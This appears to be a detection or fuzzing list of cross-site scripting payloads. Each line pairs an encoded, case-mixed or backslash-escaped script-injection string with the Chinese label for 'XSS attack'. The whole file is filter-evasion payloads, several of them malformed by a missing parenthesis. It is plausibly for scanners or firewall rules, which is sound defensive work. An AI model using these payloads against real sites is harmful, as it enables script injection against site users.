+='%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+="%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+="%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+='%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+='%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+\\><script>alert('XSS')</script> : XSS攻击
+\\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=><><script>alert('XSS')</script> : XSS攻击
+=><><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=\\><script>alert('XSS')</script> : XSS攻击
+=\\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=\><script>alert('XSS')</script> : XSS攻击
+=\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=\\><<script>alert('XSS')</script> : XSS攻击
+=\\><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=\><<script>alert('XSS')</script> : XSS攻击
+=\><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+"%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+"%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%3e%3c%3e%3cscript>alert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%3e%3c%3e%3cScRiPt>AlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+="%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+="%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+='%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+='%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+="%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+="%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+='%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+='%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+\\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=><><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=\\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=\\><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=\\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=\><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%3e%3c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%3e%3c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%5c%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+=%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS攻击
+=%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS攻击
+%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%3e%3c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%3e%3c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%5c%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+=%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
